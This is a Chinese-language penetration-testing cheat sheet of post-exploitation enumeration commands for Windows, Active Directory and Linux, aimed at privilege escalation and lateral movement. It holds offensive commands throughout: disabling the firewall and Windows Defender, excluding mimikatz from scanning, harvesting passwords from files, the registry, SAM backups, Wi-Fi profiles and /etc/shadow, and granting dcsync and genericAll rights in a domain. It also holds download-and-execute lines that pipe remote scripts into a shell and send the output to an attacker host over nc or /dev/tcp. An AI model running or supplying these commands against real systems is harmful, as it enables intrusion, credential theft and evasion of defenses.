# *枚举（windows枚举，域枚举，linux枚举；此阶段的目的是为了主机提权和内网横向收集信息。）

[TOC]

###### exp利用枚举

<br>

github.com/SecWiki/windows-kernel-exploits

github.com/strozfriedberg/Windows-Exploit-Suggester

<br>

github.com/SecWiki/linux-kernel-exploits

github.com/The-Z-Labs/linux-exploit-suggester

github.com/jondonas/linux-exploit-suggester-2

<br>

searchsploit xxx

metasploit search suggester

www.exploit-db.com #exploit-db

www.google.com #google

www.seebug.org #Seebug

github.com #github

## windows枚举（服务器信息，网络信息，用户信息，防护软件，密码搜索）

#### 服务器信息枚举（版本，架构，服务，进程，驱动，磁盘，补丁，系统，应用程序，计划任务，开机启动，环境变量）

###### 版本

```
ver #显示当前windows系统的版本号

winver #弹框显示当前windows系统信息
```

###### 架构

```
wmic os get osarchitecture #架构信息

echo %processor_architecture%
```

###### 服务

```
sc query state=all #服务信息

net start #已启动服务

wmic service list brief

get-wmiobject win32_service | select name,pathname #获取所有windows服务以及服务对应的执行文件的路径和参数
```

###### 进程

```
tasklist #列举进程信息

tasklist /svc #系统进程信息

wmic process list brief

ps
```

###### 驱动

```
driverquery #驱动信息
```

###### 磁盘

```
wmic logicaldisk get caption,description,providername #显示磁盘信息

for %i in (C D E F G) do @( if exist %i:\ ( @echo %i: exist! ) )

get-volume

tree c:\ > c:\users\xxx\desktop\tree.txt #获取某个磁盘的文件夹树，并将结果输出到文本文件

dir /s c:\ > c:\users\win2019\desktop\file.txt #获取某个磁盘的文件列表，并将结果输出到文本文件
```

###### 补丁

```
systeminfo | findstr KB 查看补丁

get-hotfix

wmic qfe get caption,hotfixid
```

###### 系统

```
systeminfo #系统信息

hostname #显示当前机器名

wmic computersystem get name,domain,roles #了解本地计算机担任的角色
```

###### 应用程序

```
gci hklm:\software | ft name #获取应用程序信息

gci "C:\Program Files\","C:\Program Files (x86)\" | ft parent,name,lastwritetime

get-wmiobject -class win32_product

wmic product get name,version

reg query "hklm\software\microsoft\net framework setup\ndp" /s /v version | sort /+26 /r #检索服务器是否安装.net及.net的版本信息

reg query "hklm\software\microsoft\powershell\1\powershellengine" /v powershellversion #powershell引擎版本信息
```

###### 计划任务

```
schtasks /query /fo list /v #计划任务信息

schtasks /query /fo list /v | findstr /v "\microsoft" #去除默认计划任务

get-scheduledtask

get-scheduledtask | ? { $_.taskpath -notlike "\microsoft*" } | ft taskname,taskpath,state,author #去除默认计划任务
```

###### 开机启动

```
wmic startup get caption,command,location #获取开机启动项文件

dir "c:\users\win2016\appdata\roaming\microsoft\windows\start menu\programs\startup" #获取某个用户开机启动项文件

dir "c:\programdata\microsoft\windows\start menu\programs\startup" #获取对所有用户都有效的开机启动项文件夹

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Runonce"

reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce"

reg query "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"

reg query "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Runonce"
```

###### 环境变量

```
set #环境变量

gci env:

dir env:
```

#### 网络信息枚举（ip，端口，网络接口，路由，共享，连接）

###### ip

```
ipconfig /all #获取本地ip地址，dns，网关等配置信息
```

###### 端口

```
netstat -ano #查看计算机当前的网络连接，监听端口，以及相应的进程id
```

###### 网络接口

```
get-netipconfiguration | ft interfacealias,interfacedescription,ipv4address #获取计算机的网络适配器名称，描述，ip地址，ip段
```

###### 路由

```
route print #获取路由表信息

get-netroute -addressfamily ipv4 | ft destinationprefix,nexthop,routemetric,ifindex
```

###### 共享

```
net share #共享信息

wmic share get name,path,status,caption
```

###### 连接

```
arp -a #查看同一局域网的用户

for /L %i in (175,1,180) do @(ping -n 1 -w 1 10.11.236.%i | findstr TTL) #查看c段ip 存在情况

for ($i=1;$i -lt 20;$i++){ping -w 1 -n 1 10.10.220.$i | findstr TTL }

1..255 | % { ping -w 1 -n 1 192.168.10.$_ | findstr TTL } 
```

#### 用户信息枚举（当前用户，所有用户/组，在线用户，用户策略）

###### 当前用户

```
whoami /all #查看当前用户名，sid，组信息，权限

whoami /user #查看当前用户sid

wmic useraccount get name,sid 查看账户sid

whoami /priv #查看当前用户权限

whoami /groups #查看当前用户组信息
```

###### 所有用户/组

```
net user #查看服务器上所有的用户账户

get-localuser | ft name,enabled,lastlogon #查看用户账户，隐藏账户，是否启用，上次登录时间

net user xxx #查看某个用户的信息

net localgroup xxx #获取某个组都有哪些用户

get-localgroupmember xxx | ft name,principalsource

reg query "hklm\software\microsoft\windows nt\currentversion\profilelist" #注册表查看用户信息

reg query "hklm\software\microsoft\windows nt\currentversion\profilelist\S-1-5-21-752174153-3003344231-3526862437-1000"

gci c:\users -force | select name
```

###### 在线用户

```
query user #获取当前在线用户

qwinsta
```

###### 用户策略

```
net accounts #查看用户策略信息
```

#### 防护软件枚举（防火墙，windows defender，常见防护软件）

###### 防火墙

```
netsh advfirewall show allprofiles #查看防火墙基础信息

netsh advfirewall set allprofiles state off #关闭防火墙

netsh advfirewall set allprofiles state on #关闭防火墙

netsh advfirewall firewall add rule name="Allow 8080 TCP" dir=in action=allow protocol=TCP localport=8080 #开通一条防火墙规则,名字为"Allow 8080 TCP",开启8080端口,允许外部访问本地8080端口，协议为tcp

netsh advfirewall firewall add rule name="block 8080 TCP" dir=in action=block protocol=TCP localport=8080 #开通一条防火墙规则,名字为"block 8080 TCP",关闭8080端口,不允许外部访问本地8080端口，协议为tcp

netsh advfirewall firewall show rule name="Allow 8080 TCP" 查看防火墙规则状态

netsh advfirewall firewall delete rule name="mm" 删除名字为Allow 8080 TCP 的防火墙规则

$f=new-object -comobject hnetcfg.fwpolicy2 ; $f.rules | ? { $_.action -eq "0" } | select name,applicationname,localports #列出所有防火墙阻止的端口
```

###### windows defender

```
get-mpcomputerstatus #获取windows defender状态

AntivirusEnabled #病毒防护

RealTimeProtectionEnabled #实时保护

OnAccessProtectionEnabled #访问时保护

BehaviorMonitorEnabled #行为监控

IsTamperProtected #篡改防护

add-mppreference -exclusionpath "c:\temp" #添加检查排除文件夹

add-mppreference -exclusionpath "mimikatz.exe" #排除进程

remove-mppreference -exclusionpath "xxx" #移除检查排除

set-mppreference -disablerealtimemonitoring $true #关闭windows defender(需要管理员权限，并已经关闭篡改服务)
```

###### 常见防护软件

```
360tray.exe/360safe.exe/ZhuDongFangYu.exe/360sd.exe #360系列防护软件

QQPCRTP.exe #QQ电脑管家

avcenter.exe/avguard.exe/avgnt.exe/sched.exe #Avira(小红伞)

SafeDogGuardCenter.exe 和其他带有 safedog字符的进程 #安全狗

D_Safe_Manage.exe/d_manage.exe #D盾

hipstray.exe/wsctrl.exe/usysdiag.exe #火绒

avp.exe #卡巴斯基

Mcshield.exe/Tbmon.exe/Frameworkservice.exe #Mcafee

egui.exe/ekrn.exe/eguiProxy.exe #ESET NOD32

ccSetMgr.exe #赛门铁克

TMBMSRV.exe #趋势杀毒

RavMonD.exe #瑞星杀毒
```

#### 密码搜索（文件，注册表，无人值守文件，安全账户数据库备份文件，便笺信息，应用中的密码，powershell历史命令记录，wifi密码，凭据管理器，wsl子系统）

###### 文件

```
findstr /S /I /M "passw" *.txt #搜索文件内容里包含"passw"字符串的.txt文件 /M 只列出文件的绝对路径

findstr /S /I /M "passw" *.txt *.ini *.config

cd /d c:\ && findstr /S /I /M "passw" *.txt *.ini *.config

dir /s *passw* #列出当前目录以及子目录中文件名包含字符串"passw"的文件

cd /d c:\ && dir /b /s *passw*

gci c:\users\ -include *passw* -recurse

where /r c:\ *passw*.txt

for /r c:\ %i in (*passw*.txt) do @echo %i

gci c:\ -recurse | ? { $_ -like "*passw*.txt" }
```

###### 注册表

```
reg query hkcu /f password /t reg_sz /s #注册表中寻找密码

reg query hkcu /f password /t reg_sz /s > temp.txt

reg query "hklm\software\microsoft\windows nt\currentversion\winlogon" #自动登录的账号和密码
```

###### 无人值守文件

```
cd c:\ && dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt #查找无人值守文件

cd c:\ && dir /s *sysprep*.inf *sysprep*.xml *unattend*.xml *unattend*.txt

gci c:\ -recurse | ? { $_ -like "*sysprep*.inf" -or $_ -like "*sysprep*.xml" -or $_ -like "*unattend*.txt"  -or $_ -like "*unattend*.xml" }

c:\windows\sysprep\sysprep.xml

c:\windows\sysprep\sysprep.inf

c:\windows\sysprep.inf

c:\windows\panther\unattended.xml

c:\windows\panther\unattend.xml

c:\windows\panther\unattend\unattend.xml

c:\windows\panther\unattend\unattended.xml

c:\windows\system32\sysprep\unattend.xml

c:\windows\system32\sysprep\unattended.xml

c:\unattend.txt

c:\unattend.inf
```

###### 安全账户数据库备份文件

```
copy c:\windows\repair\sam c:\temp\sam #安全数据库备份文件

copy c:\windows\repair\system c:\temp\system

sudo python pwdump.py system sam
```

###### 便笺信息

```
copy C:\Users\xxx\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite c:\temp\plum.sqlite #便笺内容

sqlite3 database.db
```

###### 应用中的密码

```
powershell -ep bypass "IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1');invoke-sessiongopher -thorough" #sessionGopher 应用中的密码

lazagne.exe all #lazagne github.com/AlessandroZ/LaZagne

seatbelt.exe -group=all -full #seatbelt github.com/GhostPack/Seatbelt
```

###### powershell历史命令记录

```
type C:\Users\xxx\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt #powershell历史命令记录

gc (get-psreadlineoption).HistorySavePath
```

###### wifi密码

```
netsh wlan show profiles * key=clear #wifi密码
```

###### 凭据管理器

```
cmdkey /list #列出保存的凭据

powershell -ep bypass "IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1');invoke-wcmdump"
```

###### wsl子系统

```
where /r c:\windows bash.exe #查看是否存在文件"bash.exe"来判断是否安装了WSL

wcl linux_command #linux枚举

wsl cat ~/.bash_history

wsl cat /root/.bash_history

wsl -u root cat /etc/shadow
```

#### 自动枚举

```
peass #github.com/peass-ng/PEASS-ng

post/windows/gather/enum_applications #应用程序

post/windows/gather/enum_shares #共享

post/windows/gather/enum_unattend #无人值守文件
```

## 域枚举

#### powerview(远程)

#### 安装

```
python -m venv pwview

source pwview/bin/activate

cd pwview

proxychains git clone https://github.com/aniqfakhrul/powerview.py.git #下载powerview项目

cd powerview.py 

proxychains ../bin/pip3 install "git+https://github.com/aniqfakhrul/powerview.py" #使用pwview/bin/pip3
```

#### 使用

```
powerview two/win2019:root@192.168.12.5 #连接

powerview two/win2019:root@192.168.12.5 --relay [--relay-host] [--relay-port] [--use-ldap | --use-ldaps] #relay连接

[TAB] #查看帮助

wiki:

github.com/aniqfakhrul/powerview.py



Get-Domain #AD域信息查询



Get-DomainOU [-Identity] #查询AD中所有的OU或特定OU

Add-DomainOU

Remove-DomainOU



Get-DomainComputer #查看AD域内机器账户

Add-DomainComputer/Add-ADComputer -ComputerName machine2 -ComputerPass 1qaz@WSX #添加AD域机器账户

Remove-DomainComputer/Remove-ADComputer -ComputerName machine2 #移除AD域机器账户



Get-DomainUser #查看AD域内所有账户或特定用户

Get-LocalUser

Add-DomainUser/Add-ADUser -UserName qq -UserPass 1qaz@WSX #添加AD域账户

Remove-DomainUser/Remove-ADUser -Identity "qq" #移除AD域账户



Get-DomainGroupMember [-Identity] #查看AD域组内用户

Add-DomainGroupMember/Add-GroupMember -Identity "administrators" -Members "qq" #添加AD域用户到组

Remove-DomainGroupMember/Remove-GroupMember -Identity "administrators" -Members "qq" #移除组中AD域用户



Get-DomainGroup [-Identity "administrators"] #获得全部/某个组信息

Get-DomainGroup -MemberIdentity "win2019" 查询用户所属组信息

Add-DomainGroup -Identity "qq-group" #添加域组



Get-DomainObject/Get-ADObject [-Identity] #查看AD域内域对象[-SearchBase "CN=Users,DC=two,DC=com"] 查询users容器中的对象

Set-DomainObject/Set-ADObject #添加AD域内域对象

Remove-DomainObject/Remove-ADObject #移除AD域内域对象



Get-DomainObjectOwner/Get-ObjectOwner #查询指定AD对象所有者信息

Set-DomainObjectOwner/Set-ObjectOwner #查询指定AD对象所有者信息



Add-DomainObjectAcl/Add-ObjectAcl #添加指定AD对象的ACL

Remove-DomainObjectAcl/Remove-ObjectAcl #移除指定AD对象的ACL



Get-DomainObjectAcl/Get-ObjectAcl

Get-DomainUser -Identity "win2019" #查询win2019对象的objectSid

Get-DomainObjectAcl -SecurityIdentifier "S-1-5-21-873118422-227618334-1429070027-1000"#查看win2019账户的权限（如果什么都没有就是没有权限）

Get-DomainObjectAcl -Identity "CN=win2019,CN=Users,DC=two,DC=com"#查看其他安全主体对win2019账户的权限

\#SecurityIdentifier 对 ObjectDN 所拥有的权限（ActiveDirectoryRights,AccessMask,ObjectAceType）

\#[-Select "SecurityIdentifier,ObjectDN,ActiveDirectoryRights,AccessMask,ObjectAceType" -TableView] 选择显示选项以及是否按照表格形式排列



Add-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #添加win2019对tow.com All 权限的acl

Remove-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #删除win2019对tow.com All 权限的acl
```

#### powerview

```
Get-NetDomain: 获取当前用户所在域的名称

Get-NetUser: 获取所有用户的详细信息

Get-NetDomainController: 获取所有域控制器的信息

Get-NetComputer: 获取域内所有机器的详细信息

Get-NetOU: 获取域中的OU信息

Get-NetGroup: 获取所有域内组和组成员信息

Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息

Get-NetShare: 获取当前域内所有网络共享信息

Get-NetSession: 获取指定服务器的会话

Get-NetRDPSession: 获取指定服务器的远程连接

Get-NetProcess: 获取远程主机的进程

Get-UserEvent: 获取指定用户的日志

Get-ADObiect: 获取活动目录的对象

Get-NetGPO: 获取域内所有的组策略对象

Get-DomainPolicy: 获取域默认策略或域控制器策略

Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限

Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户

Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。
```

#### bloodyAD

```
bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 #连接

bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 add genericAll "CN=win2019,CN=Users,DC=two,DC=com" "CN=kk,CN=Users,DC=two,DC=com" #添加genericAll权限，实现kk对win2019的fullcontrol
```

#### ldapsearch

```
ldapsearch -x -H ldap://192.168.12.5 -b "cn=users,dc=two,dc=com" "name=krbtgt" #匿名查询

ldapsearch -x -H ldap://192.168.12.5 -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=krbtgt" #登录查询

ldapsearch -H "ldap://192.168.12.5" -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=*" dn #查询users组下的成员，并返回每个成员的dn
```

#### nxc bloodhound

```
bloodhound-python -d one.com -u cook -p '1qaz@WSX' -dc DC.one.com -c all -ns 192.168.10.5 --zip

proxychains bloodhound-python -d one.com -u cook -p '1qaz@WSX' -dc DC.one.com -c all  --dns-tcp -ns 192.168.10.5 --zip --dns-timeout 60 #跨代理访问

nxc ldap one.com -u cook -p '1qaz@WSX' --bloodhound -c all --dns-server 192.168.10.5
```

## linux枚举（服务器信息，网络信息，用户信息，软件和文件）

#### 服务器信息枚举（虚拟化，系统基本信息，内核版本，系统架构，发行版本，系统主机名，系统环境，进程，corn自动任务，磁盘配置）

###### 虚拟化

```
systemd-detect-virt #虚拟化

grep 'docker' /proc/1/cgroup #查看是否处于docker容器中
```

###### 系统基本信息

```
uname -a #查看系统基本信息

lsb_release -a

cat /proc/version

cat /etc/issue
```

###### 内核版本

```
uname -r #内核版本信息
```

###### 系统架构

```
uname -m #系统架构
```

###### 发行版本

```
cat /etc/*-release #查看发行版
```

###### 系统主机名

```
hostname #系统主机名

uname -n

hostnamectl
```

###### 系统环境

```
env #查看系统环境变量

echo $PATH

cat /etc/profile #查看用户变量及配置文件

cat /etc/shells #查看系统可用shell
```

###### 进程

```
ps aux 2>/dev/null #查看系统进程，包括进程pid，所属用户，cpu占用率，内存占用等

ps aux 2>/dev/null | grep 'root' #筛选root权限运行的进程

ls -liah `ps aux 2>/dev/null | awk '{print $11}'` 2>/dev/null | sort | uniq #查看进程对应的文件位置

ps -ef

ps -A

ps axjf

ps aux

top -n 1
```

###### corn自动任务

```
ls -liah /etc/cron* 2>/dev/null #查看所有cron任务列表

for i in `cat /etc/passwd | cut -d: -f1` ;do echo "#crontabs for $i #" ; crontab -u $i -l 2>/dev/null ; done #查看所有用户的cron任务

crontab -l #查看当前用户cron任务

crontab -u xxx -l #查看其他用户cron任务

cat /etc/crontab
```

###### 磁盘配置

```
cat /etc/fstab 查看挂载信息

fdisk -l #查看未挂载磁盘

df -h #查看磁盘信息
```

#### 网络信息枚举（网络接口，arp缓存，路由，系统网络连接，dns）

###### 网络接口

```
ifconfig #网络接口信息

ip addr

for ((i=0;i<25;i++));do ping -w 1 -c 1 192.168.12.$i | grep -iE 'from' ;done #查看c段
```

###### arp缓存

```
arp -a #arp缓存信息

ip neigh #邻居表
```

###### 路由

```
route #路由信息

ip route
```

###### 系统网络连接

```
netstat -antlp #查看所有网络连接信息，包括网络接口，路由，协议，进程，tcp/ip统计信息

netstat -ntpl #查看正在监听的tcp端口

netstat -nupl #查看正在监听的udp端口

ss -tulnp

netstat -a

netstat -at

netstat -au

netstat -l

netstat -s

netstat -ano

###### dns

cat /etc/resolv.conf #查看dns配置文件
```

#### 用户信息枚举（当前用户，所有用户/组，id与对应组，在线用户，历史登录，超管用户，特权访问）

###### 当前用户

```
whoami #当前用户

who

id
```

###### 所有用户/组

```
cat /etc/passwd #查看所有用户

cat /etc/group #查看所有用户组
```

###### id与对应组

```
id `cat /etc/passwd | cut -d":" -f1` #查看所有用户及其对应id和组
```

###### 在线用户

```
w #查看当前登录到系统的用户信息

users #查看系统当前登录的用户
```

###### 历史登录

```
last #历史登录信息
```

###### 超管用户

```
cat /etc/passwd | awk -F: '$3 == 0 {print $1}' #查看超管用户
```

###### 特权访问

```
sudo -l #sudo特权访问

getcap -r / 2>/dev/null #capabilites权限
```

#### 软件和文件（软件信息，常用工具，敏感文件，特殊权限文件，可读可写可执行文件，特殊拓展名文件，关键字文件，历史命令记录，隐藏文件，配置文件，ssh私钥）

###### 软件信息

```
yum list installed #查看软件安装信息

apt list 

dpkg -l
```

###### 常用工具

```
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl iftp ftp tmux screen 2>/dev/null #查看常用工具
```

###### 敏感文件

```
cat /etc/passwd ; cat /etc/shadow ; cat /etc/group ; cat /etc/profile #查看敏感文件
```

###### 特殊权限文件

```
find / -perm -u=s -type f 2>/dev/null #查看suid权限

find / -perm -g=s -type f 2>/dev/null #查看sgid权限
```

###### 可读可写可执行文件

```
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/var/lib/*" ! -path "/usr/lib/*" 2>/dev/null #查看可写文件

\#-readable -writable -executable #查看可读，可写，可执行
```

###### 特殊拓展名文件

```
find / -name *.bak -type f 2>/dev/null #查看特殊后缀文件

find / -name *.bak -o -name *passw* -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/var/lib/*" ! -path "/usr/lib/*" 2>/dev/null 
```

###### 关键字文件

```
grep -in "passw" `find / -name "*.php"` #查找文件内关键字
```

###### 历史命令记录

```
ls -liah /root/.*_history /home/*/.*_history #历史命令记录

history
```

###### 隐藏文件

```
ls -liah `find /home -name ".*" 2>/dev/null` #查看隐藏文件
```

###### 配置文件

```
find /home -name "*.ovpn" -type f -exec ls -liah {} \; 2>/dev/null #查看配置文件
```

###### ssh私钥

```
find / -name id_rsa -exec ls -liah {} \; 2>/dev/null #查看ssh私钥文件
```

#### 自动枚举

###### 目标不出网，文件不落地

```
kali : nc -lvnp 81 | tee linpeas_result.txt

python3 -m http.server 80

target : curl -L kali_link/linpeas.sh | sh | nc kali_link 81

less -r linpeas.txt #格式化显示
```

###### 目标无curl，无nc，不出网，文件不落地

```
kali : nc -lvnp 443 < linpeas.sh

kali : nc -lvnp 445

target : cat < /dev/tcp/192.168.12.130/443 | sh > /dev/tcp/192.168.12.130/445



linenum

linux-smart-enumeration

linux-exploit-suggester

linuxprivchecker.py

unix-privesc-check
```